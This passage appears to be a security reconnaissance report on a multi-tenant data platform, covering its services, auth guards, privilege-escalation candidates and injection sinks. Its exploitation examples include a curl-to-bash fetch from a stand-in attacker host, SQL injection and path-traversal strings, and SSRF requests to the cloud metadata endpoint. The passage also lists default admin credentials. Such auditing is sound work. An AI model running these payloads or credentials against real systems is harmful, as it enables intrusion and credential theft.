| Jupyter Engine | Service | App | Python/Flask | PII | Notebook execution |
| PostgreSQL DB | DataStore | Data | PostgreSQL 15 | PII, Tokens, Secrets | Multi-schema multi-tenancy |
| Redis Cache | DataStore | Data | Redis 6 | Tokens | Session cache, rate limiting, task queue |
| MinIO Storage | DataStore | Data | MinIO (S3) | PII, Files | Object storage with presigned URLs |
| Meilisearch | DataStore | Data | Meilisearch v1.7 | PII | Full-text search index |
| Portal Frontend | Service | Edge | Vue 3/Vite | Public | Unified iframe-based portal |

### 6.2 Entity Metadata

| Title | Metadata |
|---|---|
| Portal Frontend | Hosts: http://localhost:5170; Tech: Vue 3.4, Vite 5.0; Auth: JWT in localStorage; Modules: System, Manager, Meta, Transfer, Service, Develop, Orchestrator |
| Gateway Service | Hosts: http://localhost:8000; Endpoints: /api/*, /ogc/*, /tiles/*, /wmts/*; Auth: API Key, JWT; Rate Limit: Configurable per application |
| System Service | Hosts: http://localhost:8180; Endpoints: /api/system/*; Auth: JWT, Internal API Key; Database: PostgreSQL system schema; Default Credentials: SuperAdmin/20251001#SuperAdmin |
| Service Module | Hosts: http://localhost:8480; Endpoints: /api/service/*, /api/query/*, /api/service/registered/proxy/*; **SSRF Vulnerability** in proxy endpoint; PublicAccess flag for OGC services |
| Develop Service | Hosts: http://localhost:8680; Endpoints: /api/develop/*; **SQL Injection** in /execute; **Path Traversal** in /notebooks/upload |
| PostgreSQL DB | Engine: PostgreSQL 15; Schemas: system, manager, meta, transfer, orchestrator, develop, service, copilot; Multi-tenancy: Schema-based + tenant_id rows; **Unencrypted Connections**: sslmode=disable |
| Redis Cache | Purpose: Session cache (5min TTL), rate limiting, Asynq task queue; Key Format: auth:token_cache:<SHA256(token)>; Performance: 90% cache hit rate |
| MinIO Storage | Buckets: addp-data (system), business buckets (per tenant); Access: Presigned URLs generated by services; **Direct Upload**: Files bypass application servers |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|---|---|---|---|---|
| Public Internet → Portal Frontend | HTTPS | :5170 / | None | Public |
| Portal Frontend → Gateway | HTTPS | :8000 /api/* | api-key OR jwt:user | Public, PII |
| Public Internet → Gateway | HTTPS | :8000 /api/system/login | None | Public |
| Public Internet → Service Module | HTTPS | :8000 /ogc/* | public-access-flag | Public |
| **Public Internet → Service Proxy** | **HTTPS** | **:8000 /api/service/registered/proxy/*** | **None (CRITICAL)** | **Public, SSRF** |
| Gateway → System Service | HTTP | :8180 /api/system/* | jwt:user OR internal-api-key | PII, Tokens |
| Gateway → Manager Service | HTTP | :8280 /api/manager/* | jwt:user | PII, Files |
| Gateway → Service Module | HTTP | :8480 /api/service/* | jwt:user OR public-access | Public, PII |
| Gateway → Transfer Service | HTTP | :8580 /api/transfer/* | jwt:user | PII |
| Gateway → Meta Service | HTTP | :8380 /api/meta/* | jwt:user | Public |
| Gateway → Develop Service | HTTP | :8680 /api/develop/* | jwt:user OR internal-api-key | PII, Secrets |
| Gateway → Orchestrator | HTTP | :8780 /api/orchestrator/* | jwt:user | Public |
| Gateway → Copilot | HTTP | :8880 /api/copilot/* | jwt:user | PII |
| All Services → PostgreSQL | TCP | :5432 | docker-network, **NO TLS** | PII, Tokens, Secrets |
| All Services → Redis | TCP | :6379 | password, docker-network | Tokens |
| Services → MinIO | HTTP | :9000 | access-key + secret-key | Files, PII |
| Manager → Meilisearch | HTTP | :7700 | master-key | PII |
| Orchestrator → Python Workflow | HTTP | :8099 /api/workflow | **SSRF risk if engine URL attacker-controlled** | Public |
| Orchestrator → Jupyter Engine | HTTP | :8097 /api/execute | **SSRF risk if engine URL attacker-controlled** | PII |
| Portal → System Frontend | iframe | http://localhost:5173 | token in query param | PII |
| Develop Service → Jupyter Engine | HTTP | :8097 /api/execute | internal, **SSRF risk** | PII |
| **Service Module → External Services** | **HTTP** | **User-controlled URL** | **None (SSRF)** | **Public, Secrets** |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|---|---|---|
| None | Auth | No authentication required, endpoint is publicly accessible. |
| api-key | Auth | Requires X-API-Key header with valid SHA-256 hashed application key. |
| jwt:user | Auth | Requires Authorization: Bearer <JWT> header with valid signature and non-expired token. |
| jwt:tenant_admin | Authorization | Requires JWT + user_type = 'tenant_admin' or 'super_admin'. |
| jwt:super_admin | Authorization | Requires JWT + user_type = 'super_admin'. |
| internal-api-key | Auth | Requires X-Internal-API-Key header for service-to-service communication (WEAK VALIDATION). |
| tenant:isolation | Authorization | Enforces tenant_id from JWT matches resource tenant_id (bypassed by SuperAdmin). |
| ownership:user | ObjectOwnership | Verifies requesting user's ID matches resource.created_by field. |
| ownership:admin | ObjectOwnership | Allows TenantAdmin or SuperAdmin to access/modify any resource in tenant. |
| builtin:protected | Authorization | Prevents modification/deletion of is_builtin=true resources. |
| public-access-flag | Authorization | Handler-level check: if service.public_access==false, requires JWT + tenant match. |
| docker-network | Network | Communication restricted to Docker bridge network (addp-network). |
| password | Protocol | Redis authentication via REDIS_PASSWORD environment variable. |
| access-key + secret-key | Protocol | MinIO S3 authentication via access/secret key pairs. |
| master-key | Protocol | Meilisearch authentication via MEILISEARCH_MASTER_KEY. |
| rate-limit | RateLimit | Configurable per-application rate limiting enforced by Gateway. |
| rate-limit:login | RateLimit | Login endpoint: 5 attempts per 15 minutes per IP address. |

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|---|---|---|---|
| anon | 0 | Global | No authentication required, public endpoints only |
| user | 1 | Tenant | Base authenticated user, can manage own resources, restricted to own tenant |
| tenant_admin | 5 | Tenant | Tenant administrator, can manage all users/resources within tenant |
| super_admin | 10 | Global | Platform administrator, bypasses all tenant restrictions, full access |

**Code Locations:**
- User type enum: `/Users/pampa/code/addp/common/models/user.go:7-11`
- Role checks: `/Users/pampa/code/addp/common/service/auth_service.go`

### 7.2 Privilege Lattice

```
Privilege Ordering (→ means "can access resources of"):
anon → user → tenant_admin → super_admin

Detailed Access Matrix:
- anon: Public endpoints only (/login, /register, /ogc/*, /tiles/* with public_access=true)
- user: Own resources within own tenant (created_by = user_id AND tenant_id = user.tenant_id)
- tenant_admin: All resources within own tenant (tenant_id = user.tenant_id)
- super_admin: All resources across all tenants (bypasses tenant_id checks, tenant_id IS NULL)

Isolation Rules:
- Tenants are isolated from each other (tenant_id foreign key enforced)
- Super users have NULL tenant_id and bypass isolation checks
- Built-in resources (is_builtin=true) are visible to all tenants but not modifiable
```

**Role Switching:** Not implemented. No impersonation or temporary privilege elevation features.

**Code Pointers:**
- Tenant isolation: `/Users/pampa/code/addp/common/service/auth_service.go:39-62` (CheckTenantAccess)
- Ownership validation: `/Users/pampa/code/addp/common/service/auth_service.go:64-82` (CheckResourceOwnership)

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|---|---|---|---|
| anon | `/login` | `/login`, `/register`, `/`, `/ogc/*`, `/tiles/*`, `/wmts/*` | None |
| user | `/` (Portal Dashboard) | All authenticated routes in own tenant | JWT Bearer token |
| tenant_admin | `/` (Portal Dashboard) | Same as user + user management in tenant | JWT Bearer token + role claim |
| super_admin | `/` (Portal Dashboard) | All routes across all tenants + tenant management | JWT Bearer token + role claim |

**Portal Modules Accessible by Role:**
- All roles (after auth): 门户首页 (Portal Home), 数据传输 (Data Transfer), 数据管理 (Data Management), 数据开发 (Data Development), 数据服务 (Data Services), 任务编排 (Task Orchestration), 元数据 (Metadata)
- TenantAdmin+: 系统管理 → 用户管理 (System Management → User Management)
- SuperAdmin only: 系统管理 → 租户管理 (System Management → Tenant Management)

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|---|---|---|---|
| anon | None | Endpoint allows anonymous access | N/A |
| user | JWT AuthMiddleware | `user_id` and `tenant_id` extracted from JWT claims | JWT claims + system.users table |
| tenant_admin | JWT AuthMiddleware | `IsTenantAdmin(user)` check in handlers/services | `system.users.user_type = 'tenant_admin'` |
| super_admin | JWT AuthMiddleware | `IsSuperAdmin(user)` check in handlers/services | `system.users.user_type = 'super_admin'` AND `tenant_id IS NULL` |

**Code Locations:**
- Middleware: `/Users/pampa/code/addp/common/middleware/auth/cached_middleware.go:39-180`
- Role checks: `/Users/pampa/code/addp/common/service/auth_service.go:25-32`
- User model: `/Users/pampa/code/addp/common/models/user.go:15-27`

## 8. Authorization Vulnerability Candidates

This section identifies specific endpoints and patterns that are prime candidates for authorization testing, organized by vulnerability type.

### 8.1 Horizontal Privilege Escalation Candidates

Ranked list of endpoints with object identifiers that could allow access to other users' resources within the same tenant.

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity | Potential Impact |
|---|---|---|---|---|---|
| **HIGH** | `/api/system/users/:id` | user_id | user_data | User profile, email, role | Access/modify other users' profiles |
| **HIGH** | `/api/system/engines/:id` | engine_id | database_credentials | Database passwords, connection strings | Access other users' database engines |
| **HIGH** | `/api/transfer/tasks/:id` | task_id | transfer_config | Source/target database credentials | Access other users' transfer tasks |
| **HIGH** | `/api/develop/items/:id` | item_id | sql_queries | Business logic SQL queries | Access other users' queries/notebooks |
| **HIGH** | `/api/service/query/:id` | service_id | data_service_config | Published data service configurations | Access other users' data services |
| **MEDIUM** | `/api/orchestrator/orchestrations/:id` | orch_id | workflow_definitions | Workflow DAGs and configurations | Access other users' workflows |
| **MEDIUM** | `/api/manager/embedding/tasks/:task_id` | task_id | embedding_metadata | Embedding generation tasks | Access other users' embedding tasks |
| **MEDIUM** | `/api/transfer/executions/:id` | execution_id | execution_logs | Transfer execution logs and results | Access other users' execution logs |
| **MEDIUM** | `/api/develop/executions/:id` | execution_id | query_results | SQL query execution results | Access other users' query results |
| **LOW** | `/api/meta/nodes/:node_id` | node_id | metadata_node | Metadata catalog nodes | Access metadata outside permission scope |

**Testing Strategy:**
1. Create two users in same tenant (UserA, UserB)
2. UserA creates resource (e.g., engine, task, query)
3. UserB attempts to access resource via `GET /api/.../:id` with UserA's resource ID
4. Expected: 403 Forbidden or 404 Not Found
5. Vulnerability: 200 OK with UserA's resource data

### 8.2 Vertical Privilege Escalation Candidates

List of endpoints requiring higher privileges, organized by target role elevation path.

**User → TenantAdmin Escalation:**

| Endpoint Pattern | Functionality | Risk Level | Impact |
|---|---|---|---|
| `POST /api/system/users` | Create new users in tenant | **HIGH** | Create admin accounts |
| `PUT /api/system/users/:id` (with user_type change) | Promote users to tenant_admin | **CRITICAL** | Self-promotion to admin |
| `DELETE /api/system/users/:id` | Delete users in tenant | **HIGH** | Delete admin accounts |
| `POST /api/system/engines` | Register database engines | **MEDIUM** | Add malicious data sources |
| `PUT /api/system/engines/:id` | Modify engine configurations | **HIGH** | Change database credentials |
| `DELETE /api/system/engines/:id` | Delete engines | **MEDIUM** | Disrupt data access |

**User/TenantAdmin → SuperAdmin Escalation:**

| Endpoint Pattern | Functionality | Risk Level | Impact |
|---|---|---|---|
| `POST /api/system/tenants` | Create new tenants | **CRITICAL** | Platform-wide access |
| `GET /api/system/tenants` | List all tenants | **HIGH** | Information disclosure |
| `PUT /api/system/tenants/:id` | Modify tenant configurations | **CRITICAL** | Take over other tenants |
| `DELETE /api/system/tenants/:id` | Delete tenants | **CRITICAL** | Destroy other tenants |
| `GET /api/internal/*` | Internal service endpoints | **HIGH** | Bypass tenant isolation |

**Testing Strategy:**
1. Authenticate as regular user
2. Attempt to access admin-only endpoints
3. Expected: 403 Forbidden with "insufficient privileges" message
4. Vulnerability: 200 OK or resource modified

### 8.3 Context-Based Authorization Candidates

Multi-step workflow endpoints that may not properly validate prior state or permissions.

| Workflow | Endpoint | Expected Prior State | Bypass Potential | Impact |
|---|---|---|---|---|
| Task Execution | `POST /api/transfer/tasks/:id/start` | Task created by user | Direct task execution without ownership check | Execute other users' tasks |
| Orchestration Execution | `POST /api/orchestrator/orchestrations/:id/execute` | Orchestration owned by user | Execute other users' workflows | Run arbitrary workflows |
| Dev Item Execution | `POST /api/develop/items/:id/execute` | Dev item owned by user | Execute other users' SQL/notebooks | SQL injection via others' queries |
| Engine Connection Test | `POST /api/system/engines/:id/test` | Engine accessible to user | Test other users' engines | Extract database credentials |
| Service Refresh | `POST /api/service/registered/:id/refresh` | Service owned by user | Refresh other users' external services | SSRF via others' service URLs |
| API Key Generation | `POST /api/system/applications/:id/keys` | Application owned by user | Generate keys for others' apps | Steal API access |

**Testing Strategy:**
1. Create resource with UserA
2. UserB attempts action endpoint without going through proper workflow
3. Expected: Validation error or ownership check failure
4. Vulnerability: Action executes despite missing authorization

### 8.4 Internal API Bypass Candidates

Endpoints vulnerable to internal API key abuse or header injection.

| Endpoint | Internal Key Behavior | Bypass Mechanism | Impact |
|---|---|---|---|
| `/api/internal/engines` | Lists all engines bypassing tenant isolation | **X-Internal-API-Key + X-Tenant-ID header injection** | Access all tenants' engines |
| `/api/internal/api-keys/validate` | Validates API key hash | Internal key allows bulk validation | Enumerate valid API keys |
| `/api/internal/audit-logs` | Creates audit log entries | Internal key allows log injection | Tamper with audit trail |
| Any endpoint with cached middleware | 5-minute cache window | Replay attack within cache TTL | Session fixation |

**Code Evidence:**
`/Users/pampa/code/addp/common/middleware/auth/cached_middleware.go:47-73` - TODO comment indicates internal API key validation is incomplete:
```go
if internalKey := c.GetHeader("X-Internal-API-Key"); internalKey != "" {
    // TODO: 验证内部 API Key
    tenantID := uint(0)
    if tenantIDStr := c.GetHeader("X-Tenant-ID"); tenantIDStr != "" {
        tid, _ := strconv.ParseUint(tenantIDStr, 10, 32)
        tenantID = uint(tid)
    }
    c.Set(ContextTenantIDKey, tenantID)  // Arbitrary tenant_id injection
}
```

## 9. Injection Sources (Command Injection, SQL Injection, LFI/RFI, SSTI, Path Traversal, Deserialization)

**Network Surface Focus:** Only includes injection sources reachable through the target web application's network interface at http://localhost:5170. Excludes sources from local-only scripts, build tools, CLI applications, development utilities, or components that cannot be accessed via network requests to the deployed application.

### 9.1 Command Injection Sources

**1. Application Launch Command**

**Entry Point:** `POST /api/apps/:id/launch`  
**File:** `/Users/pampa/code/addp/labs/abs/backend/internal/service/app_service.go`  
**Lines:** 146-148

**Data Flow:**
```
User Input (POST /api/apps) → CreateAppRequest.StartCommand (string array)
  → Stored in JSON file
  → Retrieved by LaunchApp()
  → exec.Command(app.StartCommand[0], app.StartCommand[1:]...)
```

**Dangerous Sink:**
```go
cmd := exec.Command(app.StartCommand[0], app.StartCommand[1:]...)
if workdir != "" {
    cmd.Dir = workdir  // Also user-controlled
}
```

**Validation:** NONE - User-provided command array passed directly to `exec.Command`

**Exploitation Example:**
```json
POST /api/apps
{
  "start_command": ["bash", "-c", "curl http://attacker.com/malware.sh | bash"],
  "workspace_path": "../../../tmp"
}
```

**Impact:** CRITICAL - Remote code execution on server

---

### 9.2 SQL Injection Sources

**1. Query Service Filter/OrderBy Parameters**

**Entry Point:** `GET /api/service/query/:serviceName?filter=...&orderBy=...`  
**File:** `/Users/pampa/code/addp/service/backend/internal/service/query_executor_service.go`  
**Lines:** 186-214

**Data Flow:**
```
Query Parameter ?filter=... → params.Filter (string)
  → Concatenated into SQL WHERE clause
  → fmt.Sprintf("SELECT %s FROM %s WHERE %s", ...)
  → db.Raw(query).Rows()
```

**Dangerous Sink:**
```go
if params.Filter != "" {
    // TODO: 验证 filter 中使用的字段是否在 filterable_fields 中
    whereClause = " WHERE " + params.Filter  // Direct concatenation
}
orderByClause = " ORDER BY " + params.OrderBy  // Direct concatenation
query := fmt.Sprintf("SELECT %s FROM %s%s%s LIMIT %d OFFSET %d",
    selectFields, tableName, whereClause, orderByClause, limit, offset)
```

**Validation:** NONE - TODO comment acknowledges missing validation

**Exploitation Example:**
```
GET /api/service/query/1?filter=1=1 UNION SELECT password,email FROM system.users--
GET /api/service/query/1?orderBy=1; DROP TABLE users--
```

**Impact:** HIGH - Data exfiltration, data modification, DoS

---

**2. Direct SQL Execution Endpoint**

**Entry Point:** `POST /api/develop/execute`  
**File:** `/Users/pampa/code/addp/develop/backend/internal/service/sql_engine_service.go`  
**Lines:** 81-84

**Data Flow:**
```
POST Body → ExecuteQueryRequest.Query (string)
  → sqlContent (user-controlled string)
  → db.WithContext(ctx).Raw(sqlContent).Rows()
```

**Dangerous Sink:**
```go
rows, err := db.WithContext(execCtx).Raw(sqlContent).Rows()
```

**Validation:** NONE - Intentional (SQL playground feature)

**Impact:** CRITICAL - If exposed to untrusted users (complete database access)

---

**3. Schema Name Parameter**

**Entry Point:** `GET /api/system/engines/:id/tables?schema=...`  
**File:** `/Users/pampa/code/addp/system/backend/internal/api/engine_handler.go`  
**Lines:** 356

**Data Flow:**
```
Query Parameter ?schema=... → schema (string, default "public")
  → Used in database queries without validation
```

**Validation:** NONE - Schema name not validated before use in queries

**Impact:** MEDIUM - Schema enumeration, potential for SQL injection in downstream queries

---

### 9.3 Path Traversal Sources

**1. Workspace File Serving**

**Entry Point:** `GET /api/workspace/*filepath`  
**File:** `/Users/pampa/code/addp/labs/abs/backend/internal/api/handler.go`  
**Lines:** 194-220

**Data Flow:**
```
URL Parameter *filepath → c.Param("filepath") (includes leading slash)
  → fullPath = workspaceDir + filepath
  → http.ServeFile(c.Writer, c.Request, fullPath)
```

**Dangerous Sink:**
```go
filepath := c.Param("filepath")  // User-controlled, no sanitization
fullPath := workspaceDir + filepath
http.ServeFile(c.Writer, c.Request, fullPath)
```

**Validation:** INSUFFICIENT - Only checks if file exists, no path canonicalization

**Exploitation Example:**
```
GET /api/workspace/../../../etc/passwd
GET /api/workspace/../../../app/config/.env
```

**Impact:** HIGH - Arbitrary file read, sensitive file disclosure

---

**2. Notebook File Upload**

**Entry Point:** `POST /api/develop/notebooks/upload`  
**File:** `/Users/pampa/code/addp/develop/backend/internal/api/notebook_handler.go`  
**Lines:** 249-272

**Data Flow:**
```
Multipart File Upload → file.Filename (user-controlled)
  → notebookPath := file.Filename
  → fullPath := filepath.Join(notebookDir, notebookPath)
  → out, _ := os.Create(fullPath)
```

**Dangerous Sink:**
```go
notebookPath := file.Filename  // No sanitization
fullPath := filepath.Join(notebookDir, notebookPath)
out, err := os.Create(fullPath)
```

**Validation:** NONE - Filename used directly without sanitization

**Exploitation Example:**
```
POST /api/develop/notebooks/upload
Content-Disposition: form-data; name="file"; filename="../../../tmp/malicious.ipynb"
```

**Impact:** HIGH - Arbitrary file write, path traversal

---

### 9.4 Expression Injection Sources

**1. Python Calculate Field Operator**

**Entry Point:** `POST /api/workflow` (with calculate_field operator)  
**File:** `/Users/pampa/code/addp/engines/python-workflow/operators/attribute_operators.py`  
**Lines:** 116-119

**Data Flow:**
```
Workflow Definition → calculate_field operator params
  → expression (user-controlled string)
  → simple_eval(expression, names=row.to_dict())
```

**Dangerous Sink:**
```python
result[field_name] = result.apply(
    lambda row: simple_eval(expression, names=row.to_dict()),  # simpleeval, not eval()
    axis=1
)
```

**Validation:** LIMITED - Uses `simpleeval` library (safer than `eval()` but still vulnerable)

**Exploitation Example:**
```json
POST /api/workflow
{
  "workflow_def": {
    "tasks": [{
      "operator": "calculate_field",
      "params": {
        "expression": "9**9**9"  // DoS via expensive computation
      }
    }]
  }
}
```

**Impact:** MEDIUM - Limited code execution (arithmetic only), DoS via expensive operations

---

### 9.5 SSRF (Server-Side Request Forgery) Sources

**1. Service Proxy Endpoint**

**Entry Point:** `ANY /api/service/registered/proxy/:id/*path`  
**File:** `/Users/pampa/code/addp/service/backend/internal/service/registered_service_service.go`  
**Lines:** 854-917

**Data Flow:**
```
POST /api/service/registered → CreateRegisteredServiceRequest.EndpointURL
  → service.EndpointURL (stored in database)
  → ANY /api/service/registered/proxy/:id/*path
  → targetURL = service.EndpointURL + path
  → http.Client.Do(proxyReq)
```

**Dangerous Sink:**
```go
targetURL := service.EndpointURL + path  // User controls both parts
proxyReq, _ := http.NewRequest(c.Request.Method, targetURL, nil)
resp, err := client.Do(proxyReq)  // SSRF
```

**Validation:** NONE - URL not validated against internal IP ranges or cloud metadata endpoints

**Exploitation Example:**
```bash
# Register service pointing to AWS metadata
POST /api/service/registered
{
  "endpoint_url": "http://169.254.169.254/latest/meta-data/",
  "service_type": "rest_api"
}

# Proxy to steal credentials
GET /api/service/registered/proxy/123/iam/security-credentials/
```

**Impact:** CRITICAL - Cloud credentials theft, internal network access, data exfiltration

---

**2. Registered Service Metadata Refresh**

**Entry Point:** `POST /api/service/registered` (with auto_refresh_metadata=true)  
**File:** Same as above  
**Lines:** 34-99, 413-509

**Data Flow:**
```
CreateRegisteredServiceRequest.EndpointURL → service.EndpointURL
  → refreshOGCMetadata() / refreshWMSMetadata()
  → http.NewRequest("GET", service.EndpointURL + "?service=WMS&request=GetCapabilities")
  → client.Do(req)
```

**Impact:** HIGH - Port scanning, internal service enumeration via response timing

---

**3. Orchestrator Workflow Engine Communication**

**Entry Point:** `POST /api/orchestrator/orchestrations/:id/execute`  
**File:** `/Users/pampa/code/addp/orchestrator/backend/internal/service/task_client.go`  
**Lines:** 34-98

**Data Flow:**
```
Engine Configuration → engine.ConnectionInfo (map with protocol, host, port)
  → BuildBaseURL() constructs URL
  → http.NewRequest(method, targetURL, body)
  → client.Do(req)
```

**Dangerous Sink:**
```go
baseURL := fmt.Sprintf("%s://%s:%s", protocol, host, port)  // All user-controlled
targetURL := baseURL + executeEndpoint.Path
req, _ := http.NewRequestWithContext(ctx, method, targetURL, body)
resp, err := c.httpClient.Do(req)
```

**Validation:** NONE - Protocol, host, and port from user configuration

**Exploitation Example:**
```bash
# Register malicious workflow engine
POST /api/system/engines
{
  "engine_type": "python-workflow",
  "connection_info": {
    "protocol": "http",
    "host": "169.254.169.254",
    "port": "80"
  }
}
```

**Impact:** HIGH - AWS metadata access with POST requests, internal API mutation

---

### 9.6 Injection Sources NOT FOUND

After comprehensive analysis, the following injection types were **NOT** identified in network-accessible paths:

- **SSTI (Server-Side Template Injection):** No template rendering with user input detected
- **XML/XXE Injection:** XML parsing exists but not with user-controlled input
- **Deserialization Attacks:** JSON deserialization uses safe standard libraries (Go's encoding/json, Python's json module)
- **LDAP Injection:** No LDAP queries found
- **NoSQL Injection:** MongoDB queries use GORM which provides parameterization

---

### 9.7 Injection Summary Table

| # | Type | Severity | Endpoint | File:Line | Validation |
|---|------|----------|----------|-----------|------------|
| 1 | Command Injection | **CRITICAL** | `POST /api/apps/:id/launch` | `app_service.go:146` | None |
| 2 | SQL Injection | **HIGH** | `GET /api/service/query/:id?filter=` | `query_executor_service.go:193` | None (TODO) |
| 3 | SQL Injection | **CRITICAL*** | `POST /api/develop/execute` | `sql_engine_service.go:81` | None (intentional) |
| 4 | SQL Injection | **MEDIUM** | `GET /api/system/engines/:id/tables?schema=` | `engine_handler.go:356` | None |
| 5 | Path Traversal | **HIGH** | `GET /api/workspace/*filepath` | `handler.go:194` | Insufficient |
| 6 | Path Traversal | **HIGH** | `POST /api/develop/notebooks/upload` | `notebook_handler.go:272` | None |
| 7 | Expression Injection | **MEDIUM** | `POST /api/workflow` | `attribute_operators.py:117` | Limited (simpleeval) |
| 8 | SSRF | **CRITICAL** | `ANY /api/service/registered/proxy/:id/*` | `registered_service_service.go:854` | None |
| 9 | SSRF | **HIGH** | `POST /api/service/registered` (metadata refresh) | Same:413-509 | None |
| 10 | SSRF | **HIGH** | `POST /api/orchestrator/orchestrations/:id/execute` | `task_client.go:34-98` | None |

*May be intentional for SQL playground feature

---

**END OF RECONNAISSANCE DELIVERABLE**
